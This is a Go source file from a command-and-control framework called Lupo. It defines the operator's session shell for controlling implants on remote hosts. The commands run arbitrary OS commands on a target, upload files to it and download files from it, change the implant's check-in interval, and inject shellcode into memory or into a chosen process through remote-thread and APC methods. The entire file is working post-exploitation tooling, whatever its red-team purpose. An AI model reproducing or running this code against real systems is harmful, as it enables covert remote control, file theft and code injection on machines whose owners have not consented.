package cmd

import (
	"errors"
	"fmt"
	"strconv"
	"strings"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
	"github.com/desertbit/grumble"
	"github.com/fatih/color"
)

// SessionAppConfig - Primary session nested grumble CLI config construction
// This sets up the lupo "session" nested/sub-prompt and color scheme, defines a history logfile, and toggles various grumble sepcific parameters for help command options.
var SessionAppConfig = &grumble.Config{
	Name:                  "session",
	Description:           "Interactive Session CLI",
	HistoryFile:           ".lupo.history",
	Prompt:                "lupo session " + strconv.Itoa(core.ActiveSession) + " ☾ ",
	PromptColor:           color.New(color.FgMagenta, color.Bold),
	HelpHeadlineColor:     color.New(color.FgWhite),
	HelpHeadlineUnderline: true,
	HelpSubCommands:       true,
	Flags: func(f *grumble.Flags) {
		f.String("r", "resource", "", "resource file for lupo server, all commands in this file will be executed on startup, expects default filename to exist if not specified")
	},
}

// InitializeSessionCLI - Initialize the nested session CLI arguments
//
// "session" has no arguments and is not a grumble command in and of itself. It is a separate nested grumble application and contains all new base commands.
//
// "session" base commands include:
//
//	"back" - resets the current active session to "-1" and closes the nested session sub-shell.
//
//	"session" - the actual "session" command which is used to switch sessions by specifying an argument of a session ID to switch to. This is identical to the interact command only it allows you to switch sessions while in the session sub-shell as "interact" is unavailable in the sub-shell.
//
//	"cmd" - built in command directive to denote commands that are intended to be executed as a system command of a specified session. These commands are usually sent to the client as JSON in the format of {"cmd":"<some command"}. It supports multi-line/multi-arg commands.
//
//	"kill" - takes an argument of "id" which is used to de-register the specified session.
//
//	"load" - will load any additional functions that were registered by an implant. Must be ran each time you interact with a different session unless the implants of those sessions use the same additional functions.
func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {

	var operator string

	operator = "server"

	core.LogData(operator + " started interaction with session: " + strconv.Itoa(activeSession))

	backCmd := &grumble.Command{
		Name:     "back",
		Help:     "go back to core lupo cli (or use the exit command)",
		LongHelp: "Exit interactive session cli and return to lupo cli (The 'exit' command is an optional built-in to go back as well) ",
		Run: func(c *grumble.Context) error {
			activeSession = -1

			var operator string

			operator = "server"

			core.LogData(operator + " executed: back")

			sessionApp.Close()

			return nil
		},
	}
	sessionApp.AddCommand(backCmd)

	sessionSwitchCmd := &grumble.Command{
		Name:     "session",
		Help:     "switch to session id",
		LongHelp: "Interact with a different available session by specifying the Session ID",
		Args: func(a *grumble.Args) {
			a.Int("id", "Session ID to interact with")
		},
		Run: func(c *grumble.Context) error {
			activeSession = c.Args.Int("id")

			var operator string

			sessionExists := core.SessionExists(activeSession)

			operator = "server"
			core.LogData(operator + " executed: session " + strconv.Itoa(activeSession))

			if !sessionExists {
				return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
			}

			// Close to unload any session specific functions
			sessionApp.Close()

			App = grumble.New(SessionAppConfig)
			App.SetPrompt("lupo session " + strconv.Itoa(activeSession) + " ☾ ")
			InitializeSessionCLI(App, activeSession)

			grumble.Main(App)

			return nil
		},
	}

	sessionApp.AddCommand(sessionSwitchCmd)

	sessionCMDCmd := &grumble.Command{
		Name:     "cmd",
		Help:     "execute command on session",
		LongHelp: "Executes a standard OS command that the implant for the current session will execute.",
		Args: func(a *grumble.Args) {
			a.StringList("cmd", "OS Command to be executed by the target session")
		},
		Run: func(c *grumble.Context) error {

			cmd := c.Args.StringList("cmd")

			cmdString := strings.Join(cmd, " ")

			var operator string

			operator = "server"

			core.LogData(operator + " executed on session " + strconv.Itoa(activeSession) + ": cmd " + cmdString)

			if core.Sessions[activeSession].CommandQuery != "" {
				session := core.Sessions[activeSession]

				data, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, "", "")
				if err != nil {
					return err
				}

				core.LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)
				if operator == "server" {
					fmt.Println("\nSession " + strconv.Itoa(activeSession) + " returned:\n" + data)
				}
			} else {
				core.QueueImplantCommand(activeSession, cmdString, "server")
			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionCMDCmd)

	sessionKillCmd := &grumble.Command{
		Name:     "kill",
		Help:     "kills a specified session",
		LongHelp: "Kills a session with a specified ID",
		Args: func(a *grumble.Args) {
			a.Int("id", "Session ID to kill")
		},
		Run: func(c *grumble.Context) error {

			id := c.Args.Int("id")

			var operator string

			operator = "server"

			core.LogData(operator + " executed: kill " + strconv.Itoa(id))

			sessionExists := core.SessionExists(id)

			if !sessionExists {
				return errors.New("Session " + strconv.Itoa(id) + " does not exist")
			}

			delete(core.Sessions, id)

			warningString := "Session " + strconv.Itoa(id) + " has been terminated..."

			core.LogData(warningString)

			core.WarningColorBold.Println(warningString)

			return nil
		},
	}

	sessionApp.AddCommand(sessionKillCmd)

	sessionLoadCmd := &grumble.Command{
		Name:     "load",
		Help:     "loads custom functions for a given implant",
		LongHelp: "Loads custom functions registered by an implant tied to the current session if any exist",
		Run: func(c *grumble.Context) error {

			var operator string

			operator = "server"

			core.LogData(operator + " executed: load")

			core.LoadExtendedFunctions(sessionApp, activeSession)

			return nil
		},
	}

	sessionApp.AddCommand(sessionLoadCmd)

	sessionUploadCmd := &grumble.Command{
		Name:     "upload",
		Help:     "uploads a file to a session",
		LongHelp: "Uploads a file to the host the session is running on",
		Args: func(a *grumble.Args) {
			a.String("infile", "path of the file to upload")
		},
		Flags: func(f *grumble.Flags) {
			f.String("o", "outfile", "", "(optional) alternate name to save file as")
		},
		Run: func(c *grumble.Context) error {

			uploadFile := c.Args.String("infile")

			fileName := c.Flags.String("outfile")

			if fileName == "" {
				fileName = uploadFile
			}

			var operator string

			operator = "server"

			core.LogData(operator + " executed: upload " + fileName)

			fileb64 := core.UploadFile(uploadFile)

			if fileb64 != "" {
				if core.Sessions[activeSession].CommandQuery != "" {
					cmdString := "upload"

					session := core.Sessions[activeSession]

					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, fileName, fileb64)
					if err != nil {
						return err
					}

				} else {
					cmdString := "upload " + fileName + " " + fileb64
					core.QueueImplantCommand(activeSession, cmdString, "server")
				}

				core.SuccessColorBold.Println("File: " + fileName + " should now be uploaded!")
			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionUploadCmd)

	sessionDownloadCmd := &grumble.Command{
		Name:     "download",
		Help:     "downloads a file from a session",
		LongHelp: "Downloads a file from the session to the server",
		Args: func(a *grumble.Args) {
			a.String("infile", "path of the file to download")
		},
		Run: func(c *grumble.Context) error {

			downloadFile := c.Args.String("infile")

			var operator string

			operator = "server"

			core.LogData(operator + " executed: download " + downloadFile)

			if core.Sessions[activeSession].CommandQuery != "" {
				session := core.Sessions[activeSession]

				cmdString := "download"

				data, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, downloadFile, "")
				if err != nil {
					return err
				}

				core.LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)
				core.DownloadFile(downloadFile, data)
			} else {
				cmdString := "download " + downloadFile

				core.QueueImplantCommand(activeSession, cmdString, "server")

			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionDownloadCmd)

	sessionUpdateIntervalCmd := &grumble.Command{
		Name:     "updateinterval",
		Help:     "changes the implant's update interval for check in",
		LongHelp: "Changes the implant's update interval for checking in to the Lupo C2 server",
		Args: func(a *grumble.Args) {
			a.Int("interval", "update interval in seconds")
		},
		Run: func(c *grumble.Context) error {

			updateInterval := c.Args.Int("interval")
			updateIntervalStr := strconv.Itoa(updateInterval)

			var operator string

			operator = "server"

			core.LogData(operator + " executed: updateinterval " + updateIntervalStr)

			if core.Sessions[activeSession].CommandQuery != "" {
				session := core.Sessions[activeSession]

				cmdString := "updateinterval " + updateIntervalStr

				data, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, "", "")
				if err != nil {
					return err
				}

				core.LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)

			} else {
				cmdString := "updateinterval " + updateIntervalStr

				core.QueueImplantCommand(activeSession, cmdString, "server")

			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionUpdateIntervalCmd)

	sessionMemInject := &grumble.Command{
		Name:     "mem_inject",
		Help:     "delivers a shellcode payload to be injected into memory",
		LongHelp: "delivers a shellcode payload to be injected into memory via implant defined process such as HeapAlloc or VirtualAlloc",
		Args: func(a *grumble.Args) {
			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
		},
		Flags: func(f *grumble.Flags) {
			f.String("m", "method", "any", "memory injection method default is 'any' but any other custom text can be supplied here as long as the implant understands it")
		},
		Run: func(c *grumble.Context) error {

			uploadFile := c.Args.String("shellcode")

			method := c.Flags.String("method")

			fileName := uploadFile

			var operator string

			operator = "server"

			core.LogData(operator + " executed: mem_inject -m " + method + " " + uploadFile)

			fileb64 := core.UploadFile(uploadFile)

			if fileb64 != "" {
				if core.Sessions[activeSession].CommandQuery != "" {
					cmdString := "mem_inject"

					session := core.Sessions[activeSession]

					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, method, fileb64)
					if err != nil {
						return err
					}

				} else {
					cmdString := "mem_inject " + method + " " + fileb64
					core.QueueImplantCommand(activeSession, cmdString, "server")
				}

				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected!")
			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionMemInject)

	sessionPidInject := &grumble.Command{
		Name:     "pid_inject",
		Help:     "delivers a shellcode payload to a injected into a specific process memory",
		LongHelp: "delivers a shellcode payload to a injected into a specific process memory via methods such as RemoteThread and APC Queues",
		Args: func(a *grumble.Args) {
			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
		},
		Flags: func(f *grumble.Flags) {
			f.Int("p", "pid", 0, "process identifier to inject, default is '0' for a random PID")
		},
		Run: func(c *grumble.Context) error {

			uploadFile := c.Args.String("shellcode")

			pid := c.Flags.Int("pid")

			pidString := strconv.Itoa(pid)

			fileName := uploadFile

			var operator string

			operator = "server"

			core.LogData(operator + " executed: pid_inject -p " + pidString + " " + uploadFile)

			fileb64 := core.UploadFile(uploadFile)

			if fileb64 != "" {
				if core.Sessions[activeSession].CommandQuery != "" {
					cmdString := "pid_inject"

					session := core.Sessions[activeSession]

					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, pidString, fileb64)
					if err != nil {
						return err
					}

				} else {
					cmdString := "pid_inject " + pidString + " " + fileb64
					core.QueueImplantCommand(activeSession, cmdString, "server")
				}

				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected into PID: " + pidString + "!")
			}

			return nil
		},
	}

	sessionApp.AddCommand(sessionPidInject)

}
